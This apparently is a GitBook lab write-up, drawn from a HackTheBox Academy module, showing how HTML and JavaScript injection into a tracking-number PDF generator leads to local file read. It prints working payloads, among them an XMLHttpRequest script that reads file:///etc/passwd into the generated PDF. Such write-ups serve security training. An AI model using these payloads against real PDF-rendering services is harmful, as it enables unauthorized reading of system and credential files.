---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSRF -> LFI

{% hint style="info" %}
The below example has been taken from the [Web Enumeration & Exploitation](https://academy.hackthebox.com/module/163/section/1544) of HTB's Attacking Enterprise Networks module.
{% endhint %}

The site `tracking.inlanefreight.local` accepts a tracking number and generates a PDF document. The tracking number gets reflected in the PDF (Figure 1).

<figure><img src="../../../../.gitbook/assets/html_injection.png" alt=""><figcaption><p>Figure 1: The input gets reflected within the generated PDF.</p></figcaption></figure>

The input field takes any input, not just numbers, and accepts both HTML and JS (Figure 2).

{% tabs %}
{% tab title="HTML Payload" %}
```html
<h1>test</h1>
```
{% endtab %}

{% tab title="JS Payload" %}
```javascript
<script>document.write('TESTING THIS')</script>
```
{% endtab %}
{% endtabs %}

<figure><img src="../../../../.gitbook/assets/html_injection_test.png" alt=""><figcaption><p>Figure 2: Testing HTML injection.</p></figcaption></figure>

Follow [this](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f) and [this](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/) post that use [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest), we can try to achieve LFI (Figure 3).

{% tabs %}
{% tab title="Payload" %}
```javascript
<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

<figure><img src="../../../../.gitbook/assets/html_injection_to_lfi.png" alt=""><figcaption><p>Figure 3: HTML Injection to LFI.</p></figcaption></figure>

## Resources

{% tabs %}
{% tab title="SSRF via PDF HTML Injection" %}
{% embed url="https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90" %}
{% endtab %}

{% tab title="SSRF to LFI via PDF HTML Injection" %}
{% embed url="https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f" %}
{% endtab %}
{% endtabs %}

